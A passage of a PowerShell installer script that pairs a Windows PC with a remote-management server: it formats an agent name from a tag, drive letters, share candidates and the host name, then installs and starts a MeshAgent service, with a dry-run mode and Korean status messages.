  param([string] $Tag, [string[]] $Drives, [string[]] $Shares)
  # The name the agent reports to the server is what completes the pairing: the
  # tag inside it decides the account, and the drive letters after it are the
  # same self-report a claiming PC posts. Anything that is not one bare letter
  # is dropped rather than guessed at.
  $letters = @($Drives |
    ForEach-Object { (($_ -replace ':', '')).ToUpperInvariant() } |
    Where-Object { $_ -match '^[A-Z]$' } | Sort-Object -Unique)
  # #8036: share units go in a separate brace group so the drive group keeps its
  # exact old shape. They are candidates only; an administrator approves one.
  $shareText = ''
  $candidates = @($Shares | Where-Object { $_ -match '^[A-Za-z]:=//[^/]+/[^/]+' } | Select-Object -First 8)
  if ($candidates.Count -gt 0) { $shareText = ' {' + ($candidates -join ';') + '}' }
  # The trailing word is the name Windows gave this machine. The server reads
  # the tag to decide the account, the letters to grant whole drives, and that
  # name to call the PC by until its owner renames it. Dns.GetHostName() is
  # the whole DNS name; $env:COMPUTERNAME is the 15-character NetBIOS form and
  # would store a truncated name as the link's first label.
  $machine = try { [System.Net.Dns]::GetHostName() } catch { $env:COMPUTERNAME }
  if (-not $machine) { $machine = $env:COMPUTERNAME }
  if ($letters.Count -eq 0) {
    if (-not $machine) { return $Tag + $shareText }
    return $Tag + $shareText + ' ' + $machine
  }
  if (-not $machine) { return $Tag + ' [' + ($letters -join ' ') + ']' + $shareText }
  return $Tag + ' [' + ($letters -join ' ') + ']' + $shareText + ' ' + $machine
}

if ($DryRun) {
  $agentName = Format-PadiemAgentName -Tag $tag -Drives (Get-PadiemDriveRoots) -Shares (Get-PadiemShareCandidates)
  Write-Host ("{0} -> {1}" -f $Copy.Installed, $agentUrl)
  Write-Host ("설치 위치 " + $PadiemAgentDurableExe)
  Write-Host ("실행 명령 MeshAgent.exe -install --agentName=`"" + $agentName + "`"")
  Write-Host $Copy.DryRunNote
  exit 0
}

$agentName = Format-PadiemAgentName -Tag $tag -Drives (Get-PadiemDriveRoots) -Shares (Get-PadiemShareCandidates)
$installer = Save-PadiemInstaller -Url $agentUrl
try {
  if (-not (Install-PadiemAgentService -SourceExe $installer -AgentName $agentName)) {
    if ($installed) {
      # The renewal walk stopped the running agent before it failed: bring the
      # registered service back so the already connected accounts keep this PC,
      # and say the failure instead of a confirmation wait.
      try { Start-Service -Name $PadiemAgentServiceName -ErrorAction Stop } catch { }
      Write-Error $Copy.RenewalFailed
    } else {
      Write-Error $Copy.InstallFailed
    }
    exit 6
  }
  $service = Get-Service -Name $PadiemAgentServiceName -ErrorAction SilentlyContinue
  if ($service) {
    Write-Host ("에이전트 서비스 상태: " + $service.Status + " - " + $PadiemAgentDurableExe)
  }
} finally {
  Remove-Item -LiteralPath $installer -Force -ErrorAction SilentlyContinue
}
Invoke-PadiemUserHelperInstall -Url $helperUrl -Sha256 $helperSha -Tag $tag
Write-Host $Copy.Installed
Write-Host ("{0} (표식 {1})" -f $Copy.Waiting, $tag)
